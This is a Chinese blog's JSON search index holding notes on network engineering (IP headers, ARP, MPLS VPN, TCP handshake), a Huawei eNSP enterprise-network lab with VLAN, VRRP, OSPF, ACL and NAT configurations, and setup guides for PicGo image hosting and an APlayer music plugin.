[{"title":"网络工程基础","path":"/posts/e115566c/","content":"网络工程师负责设计、部署和维护计算机网络系统，包括交换机、路由器配置，TCP&#x2F;IP、DNS等协议的掌握，以及网络安全。他们需具备良好沟通和问题解决能力，理解网络拓扑、负载均衡、高可用性及云计算等领域知识。 网络工程数据封装image.png 应用数据需要经过TCP&#x2F;IP每一层处理之后才能通过网络传输到目的端，每一层上都使用该层的协议数据单元PDU（Protocol Data Unit）彼此交换信息。不同层的PDU中包含有不同的信息，因此PDU在不同层被赋予了不同的名称。如上层数据在传输层添加TCP报头后得到的PDU被称为Segment(数据段)；数据段被传递给网络层，网络层添加IP报头得到的PDU被称为Packet(数据包)；数据包被传递到数据链路层，封装数据链路层报头和尾部得到PDU被称为Frame(数据帧)；最后，帧在物理层被转换为比特，通过网络介质传输。这种协议栈逐层向下传递数据，并添加报头和报尾的过程称为封装。 以太网头部 IP头部 TCP头部 用户数据 以太网尾部 IPIP报头 IP报头由基本报头（20字节）和扩展报头（0-40字节）组成，一字节8bit，一行32bit， 1、version：版本，长度4bit，IPv4和IPv6 2、header length：头部长度，长度4bit，描述IP报头的具体长度 3、type of service：类别服务，长度8bit，用于数据包快速转发，常用于qos服务 4、total length：总长度，长度16bit，描述IP报头和携带的数据长度总和 5、identification：标识，长度16bit，用于标识一台设备发送的数据 6、flags：标志，长度3bit，第一bit 是 保留的 第二bit 是 DF（don’t fragment不分片）， 置 0 代表可以分片，置 1 代表不可以分片 第三bit 是 MF（more fragment多分片）， 置 0 代表后续没有分片，置 1 代表后续还有分片 7、fragment offset：片偏移，长度13bit，将收到所有分片报文，按照原有顺序进行排列，每一个分片报文都会存在偏移量 第一个分片报文 偏移量值为0 第一个分片报文 偏移量值为第一个分片报文的（偏移量+携带的数据长度） 第一个分片报文 偏移量值为第二个分片报文的（偏移量+携带的数据长度） 8、TTL：time to live 生存时间，长度8bit，防止数据包在网络中无限循环。每经过一个路由器，TTL值减1，当TTL为0时，该数据包会被丢弃。 9、protocol：协议，长度8bit，标识上层协议类型，如TCP（6）、UDP（17）、ICMP（1）、IGMP（2）、EIGRP（88）、OSPF（89）。 10、header checksum：头部校验和，长度16bit，检验IP头部的完整性。 11、source ip address：源IP地址，长度32bit，标识发送数据包的设备IP地址。 12、destination ip address：目的IP地址，长度32bit，标识接收数据包的设备IP地址。 13、options：可选字段，长度可变（0-40字节），用于一些特殊用途，如安全、路由记录等。 Wireshark 抓包网络基础 Wireshark 抓包 IP地址什么是IP地址？ IP地址就是三层网络设备接口的标识 IP地址表示？ 一个IPv4地址有32 bit 采用“点分十进制”表示 一个十进制数由 8 个二进制组成 IP地址构成 网络部分：用来标识一个网络 主机部分：用来区分一个网络内的不同主机 网络掩码：网络掩码为32 bit，与IP地址的位数一样，通常也以点分十进制数来表示。 网络掩码不是一个IP地址，在二进制的表示上是一堆连续的1、后面接一堆连续的0。 通常将网络掩码中1的个数称为这个网络掩码的长度。如：掩码0.0.0.0的长度是0，掩码252.0.0.0的长度是6。 网络掩码一般与IP地址结合使用，其中值为1的比特对应IP地址中的网络位；值为0的比特对应IP地址中的主机位。即网络掩码中1的个数就是IP地址的网络号的位数，0的个数就是IP地址的主机号的位数。 IP地址子网划分IP地址子网划分 ICMPimage.png 什么是ICMP？ Internet控制消息协议ICMP (Internet Control Message Protocol)是IP协议的辅助协议。 ICMP消息封装在IP报文中，IP报文头部Protocol值为1时表示ICMP协议。 字段解释： ICMP消息的格式取决于Type和Code字段，其中Type字段为消息类型，Code字段包含该消息类型的具体参数。 校验和字段用于检查消息是否完整。 消息中包含32 bit的可变参数，这个字段一般不使用，通常设置为0。 在ICMP重定向消息中，这个字段用来指定网关IP地址，主机根据这个地址将报文重定向到指定网关。 在Echo请求消息中，这个字段包含标识符和序号，源端根据这两个参数将收到的回复消息与本端发送的Echo请求消息进行关联。尤其是当源端向目的端发送了多个Echo请求消息时，需要根据标识符和序号将Echo请求和回复消息进行一一对应。 ICMP作用？ ICMP协议用来在网络设备间传递各种差错和控制信息，对于收集各种网络信息、诊断和排除各种网络故障等方面起着至关重要的作用。 IP路由路由 ARP 协议的工作过程第一步:首先，每个主机都会有自己的 ARP 缓存区中建立一个 ARP 列表，以表示 IP 地址和MAC 地址之间的对应关系。 第二步:当源主机要发送数据时，首先检测 ARP 列表中是否对应 IP 地址的目的主机的 MAC地址，如果有，则直接发送数据。如果没有，就向本网段的所有主机发送 ARP 数据包，内容:我是 IP 地址、mac 地址，谁是 IP 地址、mac 第三步:当本网络的所有主机收到该 ARP 数据包时，首先检查数据包中的 IP 地址是否是自己的 IP 地址，如果不是，则忽略该数据包。如果是，则首先从数据包中取出源主机的 IP 和 mac 地址写入到 ARP 列表中，如果以存在，则覆盖，然后将自己的 mac 地址写入 arp 响应包中，告诉源主机自己是它想要找的 mac 地址。 第四步:源主机收到 ARP 响应包后，将目的主机的 IP 和 mac 地址写入 arp 列表，并利用此信息发送数据，如果源主机一直没有收到 arp 响应数据包， VPNVPN：虚拟私有网络 什么是VPN：就是使用隧道技术将私网数据相互通信的技术，本质就是数据的再封装 MPLS VPN网络设备概念： CE设备：用户端边缘设备 PE设备：ISP端边缘设备 P设备：ISP骨干设备 为什么私网路由不能直接在公网传递？ 因为私网地址是可以重复使用的，如果多个站点使用相同的路由，那么公网设备学习的路由就会发生冲突 公网设备（PE）如何区分公网路由和不同站点的私网路由 通过VRF技术，配置VPN实例 来隔离私网路由和公网路由 什么是VRF？是什么是VPN实例？ VRF：虚拟路由转发，在物理设备上通过虚拟化构建多台逻辑设备 VPN实例：是VRF技术具体实现手段，每一台路由器都会存在一张public路由表 [PE2]ip vpn-instance VPN-A 创建了一台逻辑路由器，该路由器生成路由表名称为VPN-A 如果接口绑定了VPN实例，则连接站点建立动态协议也需要绑定VPN实例 对于公网设备之间传递站点路由信息后（不考虑如何传递），如果P设备可以接收站点的路由，如何区分路由来自不同的站点？ PE设备根据VPN实例区分不同的站点路由，发送给P设备 P设备如果收到的路由网段相同，则无法区分 P设备如果收到的路由网段不同，则可以正常区分 PE设备如何发送不同的私网路由？ PE设备发送私网路由时，根据规则设定发送的是VPNv4路由 什么是VPNv4路由？ VPNv4路由是由 RD + ipv4私网路由 组成 什么是RD？ RD：路由区分符 书写方式 AA：NN （32bit：32bit）通过在VPN实例视图下进行配置，将不同站点的私网路由 通过指定RD进行绑定，绑定后就形成唯一的VPNv4路由[PE2-vpn-instance-VPN-A]route-distinguisher 100:1作用：用来区分不同站点相同的路由信息 如果对端PE接收了不同站点的路由，可以通过RD值进行区分，但是如何接收不同站点路由 接收进本地站点？ 在VPN实例下规定了RT值，通过RT来判断需要接收了VPNv4路由 TCP&#x2F;IP","tags":["网络工程","基础","笔记"],"categories":["网络工程"]},{"title":"企业网络规划设计与构建","path":"/posts/e0f9c34e/","content":"基于eNSP中大型校园&#x2F;企业网络规划与设计_综合大作业 topo图 需求说明1、总部局域网中所有业务IP地址参考IP地址规划表。 2、局域网使用VLAN 技术进行业务二层隔离，不同业务部门划分到不同的VLAN；其中总部主要业务分别有总经办PC1（vlan10）、财务部PC2（vlan20）、生产部PC3（vlan30）、办公部PC4（vlan40）和服务器区（vlan50）。 3、为了保证核心层链路高可靠性，总部核心交换机SH-HX-SW1和SH-HX-SW2之间，使用eth-trunk来做链路聚合，手工负载均衡方式； 4、总部接入层交换机和核心交换机之间运行MSTP，杜绝二层环路，其中SH-HX-SW1为VLAN10、VLAN20的根网桥，作为VLAN30、VLAN40和VLAN50的备份根；SH-HX-SW2为VLAN30、VLAN40和VLAN50的根网桥，作为VLAN10、VLAN20的备份根； 5、为保障网关的高可靠性，总部采用双核心设计架构，SH-HX-SW1和SH-HX-SW2为VRRP主备网关，提供网关冗余并且实现流量的负载均衡，VLAN10、VLAN20的主网关为SH-HX-SW1，备份网关为SH-HX-SW2。 VLAN30、VLAN40和VLAN50主网关为SH-HX-SW2，备份网关为SH-HX-SW1，具体地址配置请参照IP地址分配表； 6、总部局域网内实现流量互通，采用动态路由协议OSPF协议进行业务互访，具体配置根据实际情况而定。 7、总部核心交换机SH-HX-SW1和SH-HX-SW2做DHCP Server，为总部用户动态分配IP地址，两个核心交换机DHCP服务器互做备份。 8、公司内部有流量访问控制需求： (1)总经理办公室可以访问公司内部所有业务； (2)总部生产部和办公部不允许相互访问，但是均可以访问总经办和WEB服务器区域，不允许访问其他部门； (3)财务部只允许访问总经办和服务器，其他部门均不允许访问。 9、Internet访问需求： (1)企业总部为了保证Internet访问，申请了电信宽带。其中SH-BJ-R1连接电信出口。 (2)企业向电信运营商申请了一个公网地址 200.200.200.2，用于公网接口并且内部用户上网（Easy IP）；同时申请一个公网地址200.200.200.3，用于将内网的服务器发布到Internet中，并且允许 Internet 中主机可以访问内部WEB服务器（静态NAT）； (3)总部总经办、办公部和服务器可以访问Internet，财务部和生产部不允许访问Internet。 (4)Internet部分用一个路由器来进行模拟，Internet部分对应接口地址直接参考地址规划表。 1.IP规划+VLAN规划原理： VLAN（Virtual Local Area Network）即虚拟局域网，是一种将物理的LAN在逻辑上划分为多个广播域的通信技术。每一个VLAN都是一个广播域，VLAN内的主机可以直接通信，而不同VLAN之间则不能通信。 VLAN作用： 限制广播域（广播域被限制在VLAN之中，降低带宽，提高网络处理能力） 增强局域网安全（不同VLAN内的报文在传输时相互隔离，即一个VLAN内的用户不能和其它VLAN内的用户直接通信。） 提高网络健壮性（不同VLAN之间不会相互影响） SH-HX-SW112345678910111213141516171819202122232425262728293031323334353637SH-HX-SW1:&lt;Huawei&gt;sys[Huawei]un in en[Huawei]sysname SH-HX-SW1# 创建VLAN[SH-HX-SW1]vlan 10 description ZJBvlan 20 description CZCvlan 30 description SCBvlan 40 description BGBvlan 50 description WEB# 三层交换机接口配置IP地址[SH-HX-SW1]interface Vlanif10 ip address 10.10.10.1 255.255.255.0interface Vlanif20 ip address 10.10.20.1 255.255.255.0interface Vlanif30 ip address 10.10.30.1 255.255.255.0interface Vlanif40 ip address 10.10.40.1 255.255.255.0interface Vlanif50 ip address 10.10.50.1 255.255.255.0# 配置trunk[SH-HX-SW1]interface GigabitEthernet0/0/3 port link-type trunk port trunk allow-pass vlan allinterface GigabitEthernet0/0/5 port link-type trunk port trunk allow-pass vlan all SH-HX-SW212345678910111213141516171819202122232425262728293031323334353637SH-HX-SW2:&lt;Huawei&gt;sys[Huawei]un in en[Huawei]sysname SH-HX-SW2# 创建VLAN[SH-HX-SW2]vlan 10 description ZJBvlan 20 description CZCvlan 30 description SCBvlan 40 description BGBvlan 50 description WEB# 三层交换机接口配置IP地址[SH-HX-SW2]interface Vlanif10 ip address 10.10.10.2 255.255.255.0interface Vlanif20 ip address 10.10.20.2 255.255.255.0interface Vlanif30 ip address 10.10.30.2 255.255.255.0interface Vlanif40 ip address 10.10.40.2 255.255.255.0interface Vlanif50 ip address 10.10.50.2 255.255.255.0# 配置trunk[SH-HX-SW2]interface GigabitEthernet0/0/3 port link-type trunk port trunk allow-pass vlan allinterface GigabitEthernet0/0/5 port link-type trunk port trunk allow-pass vlan all SH-HX-SW312345678910111213141516171819202122232425262728293031323334353637383940SH-JR-SW3:&lt;Huawei&gt;sys[Huawei]un in en[Huawei]sysname SH-HX-SW3# 创建VLAN[SH-HX-SW3]vlan 10 description ZJBvlan 20 description CZCvlan 30 description SCBvlan 40 description BGB# 划分VLAN[SH-HX-SW3]interface GigabitEthernet0/0/3 port link-type access port default vlan 10#interface GigabitEthernet0/0/4 port link-type access port default vlan 20#interface GigabitEthernet0/0/5 port link-type access port default vlan 30#interface GigabitEthernet0/0/6 port link-type access port default vlan 40# 配置trunk[SH-HX-SW3]interface GigabitEthernet0/0/1 port link-type trunk port trunk allow-pass vlan allinterface GigabitEthernet0/0/7 port link-type trunk port trunk allow-pass vlan all PC1234567891011121314151617181920# PC配置静态地址 PC1 IP: 10.10.10.10 Subnet mask: 255.255.255.0 Gateway: 10.10.10.254 PC2 IP: 10.10.20.10 Subnet mask: 255.255.255.0 Gateway: 10.10.20.254 PC3 IP: 10.10.30.10 Subnet mask: 255.255.255.0 Gateway: 10.10.30.254 PC4 IP: 10.10.40.10 Subnet mask: 255.255.255.0 Gateway: 10.10.40.254 2.链路聚合链路聚合是将物理接口捆绑在一起作为一个逻辑接口来增加带宽和可靠性的方法。将若干条以太链路捆绑在一起形成的逻辑链路，简写为Eth-Trunk. 作用：增加带宽、提供冗余、分担负载、节约成本等 SW1123456789[SH-HX-SW1]interface Eth-Trunk 1 mode lacp-static port link-type trunk port trunk allow-pass vlan all[SH-HX-SW1]interface GigabitEthernet0/0/1 eth-trunk 1interface GigabitEthernet0/0/2 eth-trunk 1 SW2123456789[SH-HX-SW2]interface Eth-Trunk 1 mode lacp-static port link-type trunk port trunk allow-pass vlan all[SH-HX-SW2]interface GigabitEthernet0/0/1 eth-trunk 1interface GigabitEthernet0/0/2 eth-trunk 1 3.生成树MSTP多生成树协议MSTP（Multiple Spanning Tree Protocol）是IEEE 802.1s中定义的生成树协议，通过生成多个生成树，来解决以太网环路问题。 作用：防止二层环路与链路冗余。基于VLAN的数据负载分担。 SW112345678[SH-HX-SW1]stp region-configuration region-name mstp instance 1 vlan 10 20 instance 2 vlan 30 40 50 active region-configuration[SH-HX-SW1]stp instance 1 root primarystp instance 2 root secondary SW212345678[SH-HX-SW2]stp region-configuration region-name mstp instance 1 vlan 10 20 instance 2 vlan 30 40 50 active region-configuration[SH-HX-SW2]stp instance 1 root secondarystp instance 2 root primary SW312345[SH-HX-SW3]stp region-configuration region-name mstp instance 1 vlan 10 20 instance 2 vlan 30 40 50 active region-configuration 4.VRRP虚拟路由冗余协议(Virtual Router Redundancy Protocol)是由IETF提出的解决局域网中配置静态网关出现单点失效现象的路由协议，1998年已推出正式的RFC2338协议标准。 作用： 1. 主路由器失效后，备份路由器立即顶替主路由器的工作，保证数据的不丢失。 2.两个不同的路由器成为不同组的主路由器，相互备份。 3.跟踪上行链路接口状态，当上行链路接口失效时，自动将备份路由份提升为主路由器，保证数据的不丢失。 SW112345678910111213141516171819202122232425[SH-HX-SW1]interface Vlanif10 ip address 10.10.10.1 255.255.255.0 vrrp vrid 10 virtual-ip 10.10.10.254 vrrp vrid 10 priority 110 vrrp vrid 10 preempt-mode timer delay 6 vrrp vrid 10 track interface GigabitEthernet0/0/3 reduced 30#interface Vlanif20 ip address 10.10.20.1 255.255.255.0 vrrp vrid 20 virtual-ip 10.10.20.254 vrrp vrid 20 priority 110 vrrp vrid 20 preempt-mode timer delay 6 vrrp vrid 20 track interface GigabitEthernet0/0/3 reduced 30#interface Vlanif30 ip address 10.10.30.1 255.255.255.0 vrrp vrid 30 virtual-ip 10.10.30.254#interface Vlanif40 ip address 10.10.40.1 255.255.255.0 vrrp vrid 40 virtual-ip 10.10.40.254#interface Vlanif50 ip address 10.10.50.1 255.255.255.0 vrrp vrid 50 virtual-ip 10.10.50.254 SW212345678910111213141516171819202122232425262728[SH-HX-SW2]interface Vlanif10 ip address 10.10.10.2 255.255.255.0 vrrp vrid 10 virtual-ip 10.10.10.254#interface Vlanif20 ip address 10.10.20.2 255.255.255.0 vrrp vrid 20 virtual-ip 10.10.20.254#interface Vlanif30 ip address 10.10.30.2 255.255.255.0 vrrp vrid 30 virtual-ip 10.10.30.254 vrrp vrid 30 priority 110 vrrp vrid 30 preempt-mode timer delay 6 vrrp vrid 30 track interface GigabitEthernet0/0/3 reduced 30#interface Vlanif40 ip address 10.10.40.2 255.255.255.0 vrrp vrid 40 virtual-ip 10.10.40.254 vrrp vrid 40 priority 110 vrrp vrid 40 preempt-mode timer delay 6 vrrp vrid 40 track interface GigabitEthernet0/0/3 reduced 30#interface Vlanif50 ip address 10.10.50.2 255.255.255.0 vrrp vrid 50 virtual-ip 10.10.50.254 vrrp vrid 50 priority 110 vrrp vrid 50 preempt-mode timer delay 6 vrrp vrid 50 track interface GigabitEthernet0/0/5 reduced 30 5.DHCPDHCP(Dynamic Host Configuration Protocol),动态主机配置协议，是一个应用层协议。当我们将客户主机ip地址设置为动态获取方式时，DHCP服务器就会根据DHCP协议给客户端分配IP，使得客户机能够利用这个IP上网。 SW11234567891011121314151617181920212223242526272829// 全局模式dhcp地址池[SH-HX-SW1]ip pool vlan10 gateway-list 10.10.10.254 network 10.10.10.0 mask 255.255.255.0 excluded-ip-address 10.10.10.129 10.10.10.253 lease day 2 hour 12 minute 0 dns-list 114.114.114.114#ip pool vlan20 gateway-list 10.10.20.254 network 10.10.20.0 mask 255.255.255.0 excluded-ip-address 10.10.20.129 10.10.20.253 lease day 2 hour 12 minute 0 dns-list 114.114.114.114#ip pool vlan30 gateway-list 10.10.30.254 network 10.10.30.0 mask 255.255.255.0 excluded-ip-address 10.10.30.3 10.10.30.128 lease day 2 hour 12 minute 0 dns-list 114.114.114.114#ip pool vlan40 gateway-list 10.10.40.254 network 10.10.40.0 mask 255.255.255.0 excluded-ip-address 10.10.40.3 10.10.40.128 lease day 2 hour 12 minute 0 dns-list 114.114.114.114# SW21234567891011121314151617181920212223242526272829// 全局模式dhcp地址池[SH-HX-SW2]ip pool vlan10 gateway-list 10.10.10.254 network 10.10.10.0 mask 255.255.255.0 excluded-ip-address 10.10.10.129 10.10.10.253 lease day 2 hour 12 minute 0 dns-list 114.114.114.114#ip pool vlan20 gateway-list 10.10.20.254 network 10.10.20.0 mask 255.255.255.0 excluded-ip-address 10.10.20.129 10.10.20.253 lease day 2 hour 12 minute 0 dns-list 114.114.114.114#ip pool vlan30 gateway-list 10.10.30.254 network 10.10.30.0 mask 255.255.255.0 excluded-ip-address 10.10.30.3 10.10.30.128 lease day 2 hour 12 minute 0 dns-list 114.114.114.114#ip pool vlan40 gateway-list 10.10.40.254 network 10.10.40.0 mask 255.255.255.0 excluded-ip-address 10.10.40.3 10.10.40.128 lease day 2 hour 12 minute 0 dns-list 114.114.114.114# SW112345678910//全局模式启动dhcp[SH-HX-SW1]dhcp enableinterface Vlanif10 dhcp select globalinterface Vlanif20 dhcp select globalinterface Vlanif30 dhcp select globalinterface Vlanif40 dhcp select global SW212345678910//全局模式启动dhcp[SH-HX-SW2]dhcp enableinterface Vlanif10 dhcp select globalinterface Vlanif20 dhcp select globalinterface Vlanif30 dhcp select globalinterface Vlanif40 dhcp select global PC12启动DHCPipconfig查看地址 6.OSPFOSPF（Open Shortest Path First 开放式最短路径优先）是一种动态路由协议，属于内部网关协议(Interior Gateway Protocol,简称 IGP)，是基于链路状态算法的路由协议。 SW1123456789[SH-HX-SW1]ospf 1 router-id 1.1.1.1 area 0.0.0.0 network 10.10.10.0 0.0.0.255 network 10.10.20.0 0.0.0.255 network 10.10.30.0 0.0.0.255 network 10.10.40.0 0.0.0.255 network 10.10.50.0 0.0.0.255 network 10.10.60.0 0.0.0.255 network 10.10.100.0 0.0.0.255 SW2123456789[SH-HX-SW2]ospf 1 router-id 2.2.2.2 area 0.0.0.0 network 10.10.10.0 0.0.0.255 network 10.10.20.0 0.0.0.255 network 10.10.30.0 0.0.0.255 network 10.10.40.0 0.0.0.255 network 10.10.50.0 0.0.0.255 network 10.10.60.0 0.0.0.255 network 10.10.200.0 0.0.0.255 R11234[SH-BJ-R1]ospf 1 router-id 3.3.3.3 area 0.0.0.0 network 10.10.100.0 0.0.0.255 network 10.10.200.0 0.0.0.255 7.ACL访问控制列表ACL（Access Control List）是由一条或多条规则组成的集合。所谓规则，是指描述报文匹配条件的判断语句，这些条件可以是报文的源地址、目的地址、端口号等。通过ACL来对报文进行过滤，可以根据业务需求来对这些报文进行允许或阻止的策略。 目的： 防止重要的资源被恶意访问，造成损失。 防止带宽被随意挤占，提高业务的带宽质量。 防止外网的病毒侵入，给内部网络造成安全隐患。 作用： 在流量经过的网络设备的进或出接口上，匹配流量产生允许或拒绝的动作。 定义感兴趣流量，为其他策略或协议提供帮助。 SW1123456789101112131415[SH-HX-SW1]acl number 3000 rule 5 deny ip source 10.10.30.0 0.0.0.255 destination 10.10.40.0 0.0.0.255 rule 10 permit ip source 10.10.30.0 0.0.0.255 destination 10.10.10.0 0.0.0.255 rule 15 permit ip source 10.10.30.0 0.0.0.255 destination 10.10.50.0 0.0.0.255 rule 20 deny ip source 10.10.30.0 0.0.0.255 destination 10.10.20.0 0.0.0.255acl number 3001 rule 5 deny ip source 10.10.40.0 0.0.0.255 destination 10.10.30.0 0.0.0.255 rule 10 permit ip source 10.10.40.0 0.0.0.255 destination 10.10.10.0 0.0.0.255 rule 15 permit ip source 10.10.40.0 0.0.0.255 destination 10.10.50.0 0.0.0.255 rule 20 deny ip source 10.10.40.0 0.0.0.255 destination 10.10.20.0 0.0.0.255acl number 3002 rule 5 permit ip source 10.10.20.0 0.0.0.255 destination 10.10.10.0 0.0.0.255 rule 10 permit ip source 10.10.20.0 0.0.0.255 destination 10.10.50.0 0.0.0.255 rule 15 deny ip source 10.10.20.0 0.0.0.255 destination 10.10.30.0 0.0.0.255 rule 20 deny ip source 10.10.20.0 0.0.0.255 destination 10.10.40.0 0.0.0.255 SW2123456789101112131415[SH-HX-SW2]acl number 3000 rule 5 deny ip source 10.10.30.0 0.0.0.255 destination 10.10.40.0 0.0.0.255 rule 10 permit ip source 10.10.30.0 0.0.0.255 destination 10.10.10.0 0.0.0.255 rule 15 permit ip source 10.10.30.0 0.0.0.255 destination 10.10.50.0 0.0.0.255 rule 20 deny ip source 10.10.30.0 0.0.0.255 destination 10.10.20.0 0.0.0.255acl number 3001 rule 5 deny ip source 10.10.40.0 0.0.0.255 destination 10.10.30.0 0.0.0.255 rule 10 permit ip source 10.10.40.0 0.0.0.255 destination 10.10.10.0 0.0.0.255 rule 15 permit ip source 10.10.40.0 0.0.0.255 destination 10.10.50.0 0.0.0.255 rule 20 deny ip source 10.10.40.0 0.0.0.255 destination 10.10.20.0 0.0.0.255acl number 3002 rule 5 permit ip source 10.10.20.0 0.0.0.255 destination 10.10.10.0 0.0.0.255 rule 10 permit ip source 10.10.20.0 0.0.0.255 destination 10.10.50.0 0.0.0.255 rule 15 deny ip source 10.10.20.0 0.0.0.255 destination 10.10.30.0 0.0.0.255 rule 20 deny ip source 10.10.20.0 0.0.0.255 destination 10.10.40.0 0.0.0.255 SW112345// 接口应用[SH-HX-SW1]interface GigabitEthernet0/0/3 traffic-filter inbound acl 3000 traffic-filter inbound acl 3001 traffic-filter inbound acl 3002 SW212345// 接口应用[SH-HX-SW2]interface GigabitEthernet0/0/3 traffic-filter inbound acl 3000 traffic-filter inbound acl 3001 traffic-filter inbound acl 3002 8.NAT通过在出口路由上做NAT，使内网访问外网通过出口路由时，源地址会转换成特定公有地址，并且将两个ip映射关系加到NAT映射表上。 在外网向内网通信时，目的地址还是特定公有地址，但是到达出口路由器后，查看NAT映射表，从而转换为私有地址。 R112345678910111213// 将内部IP地址 10.10.50.1 映射到公共IP地址 200.200.200.3，使得外部网络可以通过公共IP地址访问内部的设备。[SH-BJ-R1]nat static global 200.200.200.3 inside 10.10.50.1 netmask 255.255.255.255// 加上静态路由[SH-BJ-R1]ip route-static 0.0.0.0 0.0.0.0 200.200.200.1ip route-static 10.10.0.0 255.255.0.0 10.10.100.2// ospf引入静态路由[SH-BJ-R1]ospf 1 import-route static// 回来的路由[SH-WW-R2]ip route-static 0.0.0.0 0.0.0.0 200.200.200.2 R2其他配置12345[SH-WW-R2]interface Ethernet0/0/0 ip address 9.9.9.254 255.255.255.0#interface Ethernet0/0/1 ip address 8.8.8.254 255.255.255.0 PC6与客户端123456789PC6IP: 9.9.9.9mask: 255.255.255.0Gateway: 9.9.9.254ClientIP：8.8.8.8mask: 255.255.255.0Gateway: 8.8.8.254","tags":["网络工程","计算机网络","综合实验","大型企业网"],"categories":["网络工程"]},{"title":"三次握手","path":"/posts/a134e589/","content":"TCP&#x2F;IP 三次握手是建立可靠的网络连接的过程，确保通信双方能够成功进行数据传输。它是基于 TCP（传输控制协议） 的连接机制，在客户端和服务器之间创建可靠的、双向通信的通道。 为什么需要三次握手？ TCP是一个面向连接的协议，保证数据在传输过程中不丢失且顺序正确。在传输数据之前，通信双方需要确认彼此的接收能力和发送能力，并同步初始序列号，确保后续数据的传输能够可靠且有序进行。 三次握手的过程 第一次握手：客户端发送 SYN 请求目的：客户端尝试与服务器建立连接，发送 SYN（Synchronize Sequence Number） 请求，告诉服务器“我想要与你建立连接”。操作：客户端生成一个 初始序列号（ISN, Initial Sequence Number），标识即将发送的数据包序列。SYN 包中包含该序列号。状态变化：客户端进入 SYN-SENT 状态，等待服务器回应。 第二次握手：服务器发送 SYN-ACK目的：服务器收到客户端的 SYN 请求后，同意建立连接，向客户端发送 SYN-ACK 数据包，确认收到请求并愿意开始通信。操作：服务器生成自己的 初始序列号，同时确认收到客户端的 SYN（即 ACK 客户端的序列号 + 1，表示已经接收）。发送一个包含 SYN 和 ACK 标志的数据包，表示服务器同意建立连接，并向客户端回应。状态变化：服务器进入 SYN-RECEIVED 状态，等待客户端确认。 第三次握手：客户端发送 ACK 确认目的：客户端收到服务器的 SYN-ACK 后，确认连接请求有效，发送 ACK（Acknowledgment） 确认数据包，告诉服务器已经收到其回应，连接可以正式建立。操作：客户端将服务器的序列号加1，作为ACK的确认号，表示收到服务器的SYN。发送 ACK 包，确认建立连接。状态变化：客户端进入 ESTABLISHED（连接建立）状态，服务器收到 ACK 后也进入 ESTABLISHED 状态，双方连接建立完成。 为什么是三次握手？第一次握手：客户端通过 SYN 包通知服务器自己想建立连接。第二次握手：服务器回应 SYN-ACK，确认收到了客户端的请求，并附带自己的初始序列号。这个过程确保服务器知道客户端的存在。第三次握手：客户端确认服务器的回应有效，发送 ACK 确认包。至此，客户端和服务器的初始序列号都得到了确认，连接正式建立。 举例说明三次握手可以把三次握手想象成一个电话交谈的开头： 第一次握手（客户端呼叫）：你拨打了一个电话，听到电话响（发送 SYN），等待对方接听。第二次握手（服务器回应）：对方接听并说：“你好，听得到吗？”（发送 SYN-ACK，表示接收请求，并希望确认你能听到）。第三次握手（客户端确认）：你回应：“听到了，现在可以开始说话了。”（发送 ACK，确认对方的消息并准备进行正式通信）。 TCP三次握手的目的可靠连接：通过三次握手，通信双方明确知道彼此的存在，并且可以开始发送和接收数据。同步序列号：三次握手的过程中，双方交换初始序列号，确保后续数据传输的有序性和可靠性。 可能的问题半连接状态：如果客户端发送 SYN 请求，但服务器没有收到 ACK 确认，则服务器会保持在半连接状态，等待客户端的响应。为防止这种情况，服务器通常会设置一个超时机制，等待一定时间后关闭该连接。通过三次握手，TCP确保了通信的可靠性和双向确认，避免了数据包的丢失或乱序问题。","tags":["网络工程","TCP/IP","计算机网络","面试重点"],"categories":["网络工程"]},{"title":"随记","path":"/posts/2ecfdbae/","content":"网络工程师负责设计、部署和维护计算机网络系统，包括交换机、路由器配置，TCP&#x2F;IP、DNS等协议的掌握，以及网络安全。他们需具备良好沟通和问题解决能力，理解网络拓扑、负载均衡、高可用性及云计算等领域知识。 网络模型OSI参考模型为了解决网络设备之间的兼容性问题，国际标准化组织ISO于1984年提出了OSI RM（开放系统互连参考模型）。 应用层表示层会话层传输层网络层数据链路层物理层 OSI参考模型各层功能TCP&#x2F;IP网络模型TCP&#x2F;IP协议栈华为与思科命令对比 华为查看命令： 1234567891011121314display ip int brief 查看接口ip地址 display int brief 查看接口的简要信息display this 查看当前配置过的命令display current-configuration 显示当前配置文件display saved-configuration 显示保存的配置文件display this 查看当前模式下的配置display current-configuration 关键词（查看关键词的配置）display mac-address 查看MAC表display arp 查看ARP表display ip routing-table 查看路由表display ospf peer 查看ospf邻居关系display ospf lsdb 查看链路关系数据库display int Eth-Trunk 查看链路聚合状态display clock 查看系统当前时间","tags":["草稿","随记"],"categories":["网络工程"]},{"title":"Github+PicGo图床","path":"/posts/e53fe72/","content":"PicGo: 一个用于快速上传图片并获取图片 URL 链接的工具支持如下图床：七牛图床、腾讯云、又拍云、GitHub、SM.MS、阿里云、Imgur图片上传+管理新体验，支持macOS,Windows,Linux 1、新建GitHub仓库 创建New repository 填写仓库信息，Repository name自命名，仓库设置为Public 2、创建token 或者直接点击链接(https://github.com/settings/tokens/new) 点击头像进入Settings -&gt; Developer settings -&gt; Personal access tokens -&gt; Tokens(classic)-&gt; Generate new tokens(classic) 勾选repo，note自命名，点击Generate token token只出现一次，记得保存 3、下载PicGo 下载链接(https://github.com/Molunerfinn/PicGo/releases) 配置GitHub图床设置 图床配置名：自命名 仓库名： 用户名&#x2F;仓库名 分支：main 域名格式：https://gcore.jsdelivr.net/gh/用户名/仓库名@分支 4、开始使用 上传区上传图片","tags":["图床"],"categories":["PicGo"]},{"title":"hexo-stellar全局音乐","path":"/posts/a02eb088/","content":"使用APlayer+MetingJS方便快捷地为你的博客添加歌单 1、安装依赖 参考 安装hexo-tag-aplayer 12yarn add hexo-tag-aplayernpm -i hexo-tag-aplayer --save 修改&#x2F;bolg&#x2F;_config.yml配置 123# 音乐播放器aplayer: meting: true 2、生成歌单 打开网易云音乐，将喜欢的歌都加入歌单，然后点击生成外链 网易云音乐 3、插入代码 参考APlayer 跳转页面保持音乐播放进度 参考Hexo添加全局音乐播放-APlayer(包含位置修改) &#x2F;bolg&#x2F;themes&#x2F;stellar&#x2F;layout&#x2F;_partial&#x2F;main&#x2F;footer.ejs /footer.ejs1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css&quot;&gt;&lt;!--我的APlayer的样式https://gcore.jsdelivr.net/gh/mikeytki/CDN@main/css/APlayer.min.css--&gt; &lt;script src=&quot;https://unpkg.com/aplayer@1.10.1/dist/APlayer.min.js&quot;&gt;&lt;/script&gt;&lt;!--APlayer的依赖--&gt; &lt;script 